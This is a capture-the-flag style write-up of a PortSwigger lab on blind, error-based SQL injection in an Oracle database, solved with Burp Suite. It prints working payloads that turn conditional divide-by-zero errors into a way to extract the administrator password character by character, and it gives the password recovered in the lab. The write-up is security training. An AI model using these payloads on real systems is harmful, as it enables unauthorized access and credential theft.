# :game_die: Lab10 : Uncovering Admin Password Through Conditional Error Handling in SQL Injection

---

# Lab10 : Uncovering Admin Password Through Conditional Error Handling in SQL Injection

## In the Name of Allah, the Most Beneficent, the Most Merciful.
All the praises and thanks be to Allah, the Lord of the ‘Alamin (mankind, jinns and all that exists).

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

### Solution

Let’s get down to business.

Select the pets or any other category and check Burp Suite for the request and start testing the tracking ID parameters.

I noticed that there is no welcome back message. However, if we insert an apostrophe mark at the end of the tracking ID, we get an internal server error.

*req / rep*

Based on the lab lesson, we need to trigger a conditional response, e.g.

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

>

The CASE statement is used to create conditional logic in a query

1st payload: We know 1 != 2 and that would result in ‘a’=’a without any error.

2nd payload: 1=1 is true and would result in the execution of 1/0. Since division by zero is mathematically impossible, it will trigger an error in the database.

>

Hint: The Database is Oracle

When we added ‘ it shows internal server error so I added another ‘ after the initial one ‘’ and I got 200 which suggests that we will be using error to extract the administrator password. We need to confirm if it is executing it as an SQL statement by using:

```
'||(SELECT '')||'
```

Reason for error: I didn’t specify which table I am selecting from.

I would specify the name of the table (dual) in our query now using:

```
'||(SELECT '' FROM dual)||'
```

The DUAL table is always present in the Oracle database. Let’s confirm once more if it is executing our statement as SQL using:

```
'||(SELECT '' FROM callgh0st)||'
```

We are told that there is a username called administrator in the users table and we need to find the password. We will be using the CASE condition statement to extract the password.

## Get callgh0st’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Payload:

```
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

>

Notice the THEN TO_CHAR(1/0)…It is only applicable in oracle.

|| : Concatenating

SELECT CASE WHEN: Condition

SUBSTR(password,1,1)=’a’ : check if the first single character of the password is ‘a’

THEN TO_CHAR(1/0) : Divide 1 by 0 which would throw an error if our request is made

ELSE ‘’ : Return nothing if our request is not successful

FROM users WHERE username=’administrator’ : select from the username called administrator in the users table

Using B[urp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder) to continuously iterate the character and offset

*Set up*

username: administrator

password: gdrc7gbbeiied24iue8s

That is all, buddy.

Always take a break whenever you are burning out. I might share tips on how I deal with burnout. *_*

Previous Write-ups:

>

*For any suggestions or Correction, Kindly reach out to me:Twitter — *[callgh0st](https://twitter.com/callgh0st)

---
